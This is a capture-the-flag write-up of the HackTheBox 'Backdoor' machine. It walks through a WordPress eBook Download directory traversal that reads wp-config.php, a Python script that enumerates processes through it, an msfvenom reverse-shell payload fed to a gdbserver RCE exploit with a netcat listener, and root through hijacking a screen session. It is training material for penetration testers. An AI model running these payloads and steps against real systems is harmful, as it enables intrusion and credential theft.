# Backdoor

## Introduction

Welcome to my another writeup! In this HackTheBox [Backdoor](https://app.hackthebox.com/machines/Backdoor) machine, you'll learn: Enumerating and exploiting WordPress plugin, `gdbserver` RCE, privilege escalation via hijacking `screen` session, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: user to root](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Backdoor/images/Backdoor.png)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|15:12:20(HKT)]
└> export RHOSTS=10.10.11.125
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|15:12:26(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu+9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE+AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE+UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L+BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU+sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh+RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8SUJAk=
|   256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf+RPo0ydNk7yfqca
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
|_http-generator: WordPress 5.8.1
1337/tcp open  waste?  syn-ack
```

According to `rustscan` result, we have 3 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|22                | OpenSSH 8.2p1 Ubuntu          |
|80                | Apache httpd 2.4.41 ((Ubuntu))|
|1337              | Unknown                       |

### HTTP on port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|15:14:11(HKT)]
└> echo "$RHOSTS backdoor.htb" | sudo tee -a /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Backdoor/images/Pasted%20image%2020230725151601.png)

**In the above `nmap`'s script scan, we knew that the web application is using a CMS (Content Management System) called "WordPress":**
```shell
|_http-generator: WordPress 5.8.1
```

**Hence, we can use a tool called `wpscan` to enumerate plugins and vulnerabilities in this WordPress:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|15:24:05(HKT)]
└> wpscan --url http://backdoor.htb/ -e ap
[...]
[+] Upload directory has listing enabled: http://backdoor.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
[...]
[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://backdoor.htb/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |  - http://backdoor.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
[...]
[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.
[...]
```

Uhh... No plugins??

**We can also enumerate WordPress users and bruteforce their password:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|15:25:53(HKT)]
└> wpscan --url http://backdoor.htb/ -e u   
[...]
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=============================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://backdoor.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|15:26:11(HKT)]
└> wpscan --url http://backdoor.htb/ -U 'admin' -P /usr/share/wordlists/rockyou.txt 
[...]
[+] Performing password attack on Wp Login against 1 user/s
Trying admin / onlyone Time: 00:03:02 <                       > (6987 / 14344392)  0.04%  ETA: ??:??:??
[...]
```

But no dice...

Let's take a step back.

Since the machine's name is called "Backdoor", I assume that someone implemented a backdoor in the WordPress application??

**We can try to find the backdoor via `gobuster` or other content discovery tools:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|15:30:29(HKT)]
└> gobuster dir -u http://backdoor.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 40 -x php,txt,zip,bak,7zip,phtml
[...]
```

But yet again, no luck.

Umm... Maybe there's a not so popular plugin in WordPress?

**We can also look at the `/wp-content/plugins/` directory, which holds all the installed plugins:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|15:41:49(HKT)]
└> curl -s http://backdoor.htb/wp-content/plugins/ | html2text
****** Index of /wp-content/plugins ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[DIR]]       ebook-download/  2021-11-10 14:18    -  
[[   ]]       hello.php        2019-03-18 17:19 2.5K  
===========================================================================
     Apache/2.4.41 (Ubuntu) Server at backdoor.htb Port 80
```

As you can see, there's a `hello.php` PHP file, which is the default plugin in WordPress called "Hello Dolly".

> Note: Normally, we wouldn't able to list the contents of `/wp-content/plugins/` and it should be a blank page. But in this case, it seems like the `index.php` in `/wp-content/plugins/` is somehow deleted??

**Moreover, the `ebook-download` directory looks like a plugin:** 
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|15:44:14(HKT)]
└> curl -s http://backdoor.htb/wp-content/plugins/ebook-download/ | html2text
****** Index of /wp-content/plugins/ebook-download ******
[[ICO]]       Name                     Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                            -  
[[DIR]]       assets/                  2021-11-10 14:18    -  
[[   ]]       ebookdownload.php        2015-11-29 14:38  32K  
[[   ]]       filedownload.php         2015-11-16 10:27  587  
[[TXT]]       readme.txt               2015-11-29 14:38 1.6K  
[[TXT]]       style.css                2015-11-29 14:39 1.6K  
[[   ]]       widget-ebookdownload.php 2015-11-16 10:27 8.5K  
===========================================================================
     Apache/2.4.41 (Ubuntu) Server at backdoor.htb Port 80
```

Upon researching, in WordPress, there's a plugin called "eBook Download":

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Backdoor/images/Pasted%20image%2020230725154649.png)

**And its version is 1.1 in the machine's WordPress:** (`readme.txt`)
```
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|15:45:23(HKT)]
└> curl http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
[...]
Stable tag: 1.1
[...]
```

**Most importantly, version 1.1 is vulnerable to "Directory Traversal":**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|15:47:18(HKT)]
└> searchsploit WordPress ebook download
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
WordPress Plugin eBook Download 1.1 - Directory Traversal            | php/webapps/39575.txt
--------------------------------------------------------------------- ---------------------------------
```

**Let's mirror the `txt` file!**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|15:47:28(HKT)]
└> searchsploit -m 39575
  Exploit: WordPress Plugin eBook Download 1.1 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/39575
     Path: /usr/share/exploitdb/exploits/php/webapps/39575.txt
    Codes: N/A
 Verified: True
File Type: ASCII text
Copied to: /home/siunam/ctf/htb/Machines/Backdoor/39575.txt
```

**39575.txt:**
```
# Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal
# Exploit Author: Wadeek
# Website Author: https://github.com/Wad-Deek
# Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip
# Version: 1.1
# Tested on: Xampp on Windows7

[Version Disclosure]
======================================
http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt
======================================

[PoC]
======================================
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
======================================
```

**In the PoC (Proof-of-Concept), there's a Directory Traversal payload:**
```
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

When we send a GET request to `/wp-content/plugins/ebook-download/filedownload.php` with parameter `ebookdownloadurl`, it'll download the URL's content for us with its parameter's value:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|15:50:03(HKT)]
└> curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
[...]
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', '{Redacted}' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
[...]
```

Nice! We found the MySQL database credentials!

Since SSH is opened in the target machine, we can try to login user `wordpressuser` to see if there's any password reuse:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|15:51:52(HKT)]
└> ssh wordpressuser@$RHOSTS
[...]
wordpressuser@10.10.11.125's password: 
Permission denied, please try again.
```

Nope.

**How about WordPress login page? (`/wp-login.php`)**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Backdoor/images/Pasted%20image%2020230725155524.png)

Nope...

## Initial Foothold

Then, I wonder what's that 1337 port doing and what it's process ID.

In Linux, the `/proc` directory contains all running processes' information, like file descriptor (stdin, stdout, sterr).

**Most importantly, we can read the command line of the processes in `/proc/<pid>/cmdline`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|16:18:50(HKT)]
└> cat /proc/*/cmdline
/sbin/initsplash/lib/systemd/systemd-journaldvmware-vmblock-fuse/run/vmblock-fuse-orw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid/lib/systemd/systemd-udevd/usr/sbin/haveged--Foreground--[...]
```

Hence, we can try to figure out what's that port 1337 process doing.

**To do so, I'll write a simple Python script to loop through all possible PID (Process ID):**
```python
#!/usr/bin/env python3
import requests

if __name__ == '__main__':
    URL = 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../..'
    MINIMUM_PID = 1
    MAXIMUM_PID = 10000 # you can change it to whatever you want

    for pid in range(MINIMUM_PID, MAXIMUM_PID):
        exploitURL = f'{URL}/proc/{pid}/cmdline'
        print(f'[*] Trying PID: {pid}', end='\r')
        exploitResponse = requests.get(exploitURL)

        directoryTraversalPath = f'../../../../../../../../../../proc/{pid}/cmdline'
        scriptTag = '<script>window.close()</script>'
        responseText = ''
        if directoryTraversalPath in exploitResponse.text:
            responseText = exploitResponse.text.replace(directoryTraversalPath, '')
        if scriptTag in exploitResponse.text:
            responseText = responseText.replace(scriptTag, '')

        isEmptyReponseText = True if len(responseText) == 0 else False
        if not isEmptyReponseText:
            print(f'[+] Found PID {pid}: {responseText}')
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|16:38:12(HKT)]
└> python3 enumerate_processes.py
[...]
[+] Found PID 847: /usr/sbin/CRON-f
[+] Found PID 861: /bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
[...]
[+] Found PID 874: /bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
[...]
```

**As you can see, PID `861` and `874` is weird:**
```sh
while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
```

When a cronjob is being ran, it'll Switch User to `user`, and go to directory `/home/user` and **start `gdbserver` on port 1337 in all network interfaces.**

`gdbserver` (Or `gdb` GDB debugger run on locally), is a computer program that makes it possible to remotely [debug](https://en.wikipedia.org/wiki/Debugging "Debugging") other programs.

In the above command line, we can see that `gdbserver` is debugging `/bin/true` program.

**Hmm... I wonder if there's any vulnerability in `gdbserver`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|16:45:18(HKT)]
└> searchsploit gdbserver        
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
GNU gdbserver 9.2 - Remote Command Execution (RCE)                   | linux/remote/50539.py
--------------------------------------------------------------------- ---------------------------------
```

Oh! RCE (Remote Code/Command Execution) in gdbserver version 9.2!

**Let's mirror the exploit script:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|16:46:14(HKT)]
└> searchsploit -m 50539
  Exploit: GNU gdbserver 9.2 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50539
     Path: /usr/share/exploitdb/exploits/linux/remote/50539.py
    Codes: N/A
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/siunam/ctf/htb/Machines/Backdoor/50539.py
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|16:47:27(HKT)]
└> python3 50539.py --help

Usage: python3 50539.py <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 50539.py 10.10.10.200:1337 rev.bin
```

> Note: For more details about this vulnerability, you can read this blog: [http://jbremer.org/turning-arbitrary-gdbserver-sessions-into-rce/](http://jbremer.org/turning-arbitrary-gdbserver-sessions-into-rce/).

**To gain initial foothold on the target machine via exploiting `gdbserver` version 9.2, we need to:**

- Generate shellcode with `msfvenom`:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|16:49:35(HKT)]
└> msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 PrependFork=true -o rev.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Saved as: rev.bin
```

- Setup a listener with Netcat:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|16:50:26(HKT)]
└> nc -lnvp 443
listening on [any] 443 ...
```

- Run the exploit:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|16:51:09(HKT)]
└> python3 50539.py 10.10.11.125:1337 rev.bin
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Backdoor)-[2023.07.25|16:50:26(HKT)]
└> nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.125] 47112

python3 -c "import pty;pty.spawn('/bin/bash')"
user@Backdoor:/home/user$ whoami; id; hostname; ip a
whoami; id; hostname; ip a
user
uid=1000(user) gid=1000(user) groups=1000(user)
Backdoor
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:ea:4c brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.125/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:ea4c/64 scope global dynamic mngtmpaddr 
       valid_lft 86391sec preferred_lft 14391sec
    inet6 fe80::250:56ff:feb9:ea4c/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `user`!

**user.txt:**
```shell
user@Backdoor:/home/user$ cat /home/user/user.txt
{Redacted}
```

## Privilege Escalation

### user to root

We can now perform basic system enumerations to try to escalate our privilege to `root`.

**SUID binary:**
```shell
user@Backdoor:/home/user$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/su
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/screen
/usr/bin/umount
/usr/bin/mount
/usr/bin/chsh
/usr/bin/pkexec
```

In here, we can see there's a non-default SUID binary: `/usr/bin/screen`.

> Screen or GNU Screen is a terminal multiplexer. In other words, it means that you can start a screen session and then open any number of windows (virtual terminals) inside that session. Processes running in Screen will continue to run when their window is not visible even if you get disconnected. (From [https://linuxize.com/post/how-to-use-linux-screen/](https://linuxize.com/post/how-to-use-linux-screen/))

TLDR: `screen` is a terminal like Tmux.

**We can spawn a new terminal session via `screen`:**
```shell
user@Backdoor:/home/user$ screen
Please set a terminal type.
```

However, our current reverse shell session doesn't have `TERM` environment variable set.

**Let's set it!**
```shell
user@Backdoor:/home/user$ export TERM=xterm-256color
```

```shell
user@Backdoor:/home/user$ screen
[...]
[Press Space for next page; Return to end.]

$ whoami; id
user
uid=1000(user) gid=1000(user) groups=1000(user)
$ exit
[screen is terminating]
```

**According to [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#screen-sessions-hijacking), we can try to hijack a `screen` session:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Backdoor/images/Pasted%20image%2020230725170446.png)

**When we're figuring out what's port 1337 doing, we also found this:**
```sh
while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
```

This command line will `find` directory `/var/run/screen/S-root/`, and execute `screen` program as root.

**That being said, it should has the `root` user's screen session:** 
```shell
user@Backdoor:/home/user$ screen -ls
No Sockets found in /run/screen/S-user.
user@Backdoor:/home/user$ screen -ls root/
There is a suitable screen on:
	17902.root	(07/25/23 09:00:35)	(Multi, detached)
1 Socket in /run/screen/S-root.
```

Nice!

**Then, we can try to attach the screen session via `screen -x [user]/[session id]`:**
```shell
user@Backdoor:/home/user$ screen -x root/17902.root    
root@Backdoor:~# whoami; id; hostname; ip a
whoami; id; hostname; ip a
root
uid=0(root) gid=0(root) groups=0(root)
Backdoor
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:ea:4c brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.125/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:ea4c/64 scope global dynamic mngtmpaddr 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:feb9:ea4c/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `root`!

## Rooted

**root.txt:**
```shell
root@Backdoor:~# cat /root/root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Backdoor/images/Pasted%20image%2020230725170921.png)

## Conclusion

What we've learned:

1. Enumerating WordPress
2. Exploiting WordPress Plugin "eBook Download" Version 1.1
3. Enumerating Processes' Command Line (`/proc/<PID>/cmdline`)
4. Exploiting `gdbserver` RCE vulnerability
5. Vertical Privilege Escalation Via hijacking `screen` session